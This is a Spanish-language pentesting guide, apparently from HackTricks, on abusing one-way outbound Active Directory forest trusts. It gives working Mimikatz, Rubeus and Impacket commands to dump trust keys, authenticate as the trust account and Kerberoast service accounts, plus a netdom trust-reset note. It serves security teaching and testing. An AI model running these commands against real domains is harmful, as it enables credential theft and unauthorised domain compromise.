# Dominio de bosque externo - One-Way (Outbound)

{{#include ../../banners/hacktricks-training.md}}

En este escenario **tu dominio** está **confiando** ciertos **privilegios** a principals de un **dominio/bosque diferente**.

## Enumeración

### Outbound Trust
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
Si tienes disponible el módulo AD, inspecciona también directamente el **Trusted Domain Object (TDO)**. Esto te da los datos sin procesar del trust respaldados por LDAP que más tarde necesitarás al decidir si la ruta fácil es **FSP/group abuse** o **trust-account abuse**:
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
También deberías enumerar dónde los principals externos de `CN=ForeignSecurityPrincipals` fueron realmente autorizados. Los casos comunes son:

- **Local admin** en un server/DC en tu dominio actual
- Membership en un **custom domain group** que tenga ACLs sobre users/computers/GPOs
- Rights para modificar **computer objects**, lo que después puede convertirse en [RBCD](resource-based-constrained-delegation.md) si la trust configuration lo permite

## Trust Account Attack

Cuando se crea un one-way trust desde el domain/forest **B** hacia el domain/forest **A** (**B trusts A**), se crea una **trust account** para **B** en **A**. En la outbound-trust view de **A**, esto es útil porque si después comprometes **B** (el lado trusting), puedes volcar allí el trust secret y authenticarte de vuelta a **A** como `B$`.

El aspecto crítico a entender aquí es que el password y el material Kerberos de esa trust account pueden extraerse de un Domain Controller en el domain **trusting** usando:
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Esto funciona porque la cuenta de trust creada en el dominio **trusted** es un principal habilitado que termina con los derechos base de un usuario normal de dominio allí. Eso suele ser suficiente para empezar a enumerar LDAP, solicitar tickets y encontrar la siguiente ruta de escalada.

En un escenario en el que `ext.local` es el dominio **trusting** y `root.local` es el dominio **trusted**, se crea una cuenta de usuario llamada `EXT$` dentro de `root.local`. Volcar las trust keys desde `ext.local` revela credenciales que pueden usarse como `root.local\EXT$` contra `root.local`:
```bash
lsadump::trust /patch
```
Siguiendo esto, usa la clave **RC4** extraída para autenticarte como `root.local\EXT$` dentro de `root.local`:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Entonces enumera el dominio de confianza como ese principal, por ejemplo mediante Kerberoasting de un SPN de alto valor en `root.local`:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Desde Linux

Si recuperaste la clave de la cuenta de confianza **RC4**, la misma idea funciona desde Linux con Impacket:
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
Si **RC4** no es aceptado, vuelve al **cleartext password** recuperado (o a las claves **AES** derivadas) y reutiliza los flujos habituales de [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) y [Kerberoast](kerberoast.md) desde ese foothold.

### Key material gotchas

No confundas **trust keys** con **trust-account credentials**:

- En una one-way trust, ambos lados almacenan un **TDO**, pero la **cuenta de usuario `EXT$` real solo existe en el trusted domain**.
- La contraseña actual de la trust-account se refleja en el secreto de trust del TDO (`NewPassword` / current trust key).
- La trust key **RC4** es el artefacto más fácil de reutilizar para `asktgt` como la trust account; en configuraciones por defecto, normalmente este es el enctype que funciona porque la trust account suele tener un `msDS-SupportedEncryptionTypes` en blanco.
- Si estás pensando en términos de **AES trust keys**, recuerda que no son intercambiables con las AES keys de la trust-account porque los salts difieren.

Así que, para la técnica de esta página, prefiere el material **RC4** volcado o la **cleartext** recuperada.

### Gathering cleartext trust password

En el flujo anterior se usó el trust hash en lugar del **cleartext password** (que también es **dumped by mimikatz**).

La contraseña en texto claro puede obtenerse convirtiendo la salida \[ CLEAR ] de mimikatz desde hexadecimal y eliminando los null bytes `\x00`:

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be obtained by converting the ( CLEAR ) output from mimikatz from hexadecimal and removing null...](<../../images/image (938).png>)

A veces, al crear una trust relationship, el usuario debe escribir una contraseña para la trust. En esta demostración, la key es la trust password original y por lo tanto es legible por humanos. A medida que la key rota (por defecto: cada 30 días), la cleartext normalmente deja de ser legible por humanos, pero sigue siendo técnicamente usable.

La cleartext password puede usarse para realizar autenticación normal como la trust account, como alternativa a solicitar un TGT con la Kerberos secret key de la trust account. Aquí, consultando `root.local` desde `ext.local` para miembros de `Domain Admins`:

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be used to perform regular authentication as the trust account, an alternative to requesting a TGT...](<../../images/image (792).png>)

### Practical limitations

> [!WARNING]
> Las trust accounts son principals incómodos. Los interactive logons como **RUNAS / console / RDP** no son la vía esperada aquí, y los intentos de autenticación **NTLM** pueden fallar con `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`. Planifica **Kerberos network logons** (`asktgt`, LDAP, CIFS, Kerberoast) en su lugar.

### Persistence / cleanup note

Si los defensores se dan cuenta de que el trusting domain fue comprometido, deberían rotar el trust secret en **ambos lados** con `netdom trust ... /resetOneSide ...`. Desde la perspectiva del operador, esto importa porque un **manual reset invalida de inmediato el material de trust antiguo**, mientras que la rotación normal de la trust password conserva los valores actuales/anteriores durante el rollover.
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## References

- [https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
